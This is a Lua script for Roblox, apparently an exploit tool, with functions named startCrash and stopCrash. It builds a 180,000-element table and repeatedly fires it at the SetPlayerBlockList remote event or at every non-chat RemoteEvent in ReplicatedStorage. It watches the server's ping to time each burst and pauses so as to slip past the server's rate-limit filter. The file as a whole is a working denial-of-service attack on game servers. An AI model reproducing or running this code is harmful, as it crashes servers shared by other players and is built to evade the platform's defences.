-- ═══════════ CORE LOGIC ═══════════
local Children       = 180000
local FireBurst      = 1.5
local Format         = "pair"

local state = { running = false, thread = nil, remote = nil, cache = nil, passes = 0, isSpam = false }
local RemoteCandidates = {
    { "RobloxReplicatedStorage", "SetPlayerBlockList" },
    { "ReplicatedStorage",       "SetPlayerBlockList" },
}
local spamRemotes = {}

local function resolve()
    for _, path in ipairs(RemoteCandidates) do
        local node, ok = game, true
        for i = 1, #path do
            local nxt = node:FindFirstChild(path[i])
            if not nxt then ok = false; break end
            node = nxt
        end
        if ok and node and (node:IsA("RemoteEvent") or node:IsA("UnreliableRemoteEvent")) then
            return node
        end
    end
    return nil
end

local function findSpamRemotes()
    table.clear(spamRemotes)
    local rs = game:GetService("ReplicatedStorage")
    if rs then
        for _, obj in ipairs(rs:GetDescendants()) do
            if obj:IsA("RemoteEvent") and not obj.Name:lower():match("chat") and not obj.Name:lower():match("mouse") then
                table.insert(spamRemotes, obj)
            end
        end
    end
end

local function build(size)
    local sz = size or Children
    local root = table.create(sz)
    for i = 1, sz do root[i] = { id = i, v = i * 2 } end
    return root
end

local function fire()
    if not state.remote then
        state.remote = resolve()
        if not state.remote then return end
    end
    if not state.cache then state.cache = build() end
    
    if state.isSpam then
        for _, r in ipairs(spamRemotes) do
            pcall(function() r:FireServer(state.cache) end)
        end
    else
        for _ = 1, FireBurst do
            state.remote:FireServer(state.cache)
        end
    end
    state.passes += 1
end

local function getPing()
    local ok, p = pcall(function() return Stats.Network.ServerStatsItem["Data Ping"]:GetValue() end)
    return ok and math.floor(p) or 0
end

local function startCrash(isSpam)
    if state.running then return end
    state.running = true
    state.isSpam = isSpam
    state.passes = 0
    
    if isSpam then findSpamRemotes() end
    
    state.thread = task.spawn(function()
        while state.running do
            if state.isSpam then
                pcall(fire)
                task.wait(0.05)
            else
                -- ✅ ADAPTIVE SYNC (Calculates exact server CD)
                local pBefore = getPing()
                pcall(fire)
                
                if type(updateStatus) == "function" then
                    updateStatus("Fired! Waiting for server spike...", Color3.fromRGB(0, 200, 255))
                end
                
                -- 1. Wait for the server to react (ping spike)
                local timeOut = tick() + 2.5
                local spiked = false
                while tick() < timeOut and state.running do
                    if getPing() > pBefore + 100 then
                        spiked = true
                        break
                    end
                    task.wait(0.05)
                end
                
                -- 2. If it spiked, wait EXACTLY until it drops back down
                if spiked then
                    if type(updateStatus) == "function" then
                        updateStatus("Server Processing... Waiting for exact CD", Color3.fromRGB(255, 200, 50))
                    end
                    while getPing() > pBefore + 50 and state.running do
                        task.wait(0.2)
                    end
                    if type(updateStatus) == "function" then
                        updateStatus("Server Ready! Firing...", Color3.fromRGB(0, 255, 0))
                    end
                    task.wait(0.1) -- Exact millisecond buffer
                else
                    -- If it didn't spike, the server ignored it. Wait 2 seconds to not trigger their rate limit filter.
                    if type(updateStatus) == "function" then
                        updateStatus("Ignored. Buffering CD...", Color3.fromRGB(255, 50, 50))
                    end
                    task.wait(2)
                end
            end
        end
    end)
end

local function stopCrash()
    state.running = false
    if state.thread then pcall(task.cancel, state.thread) end
    state.thread = nil
    state.cache = nil
end

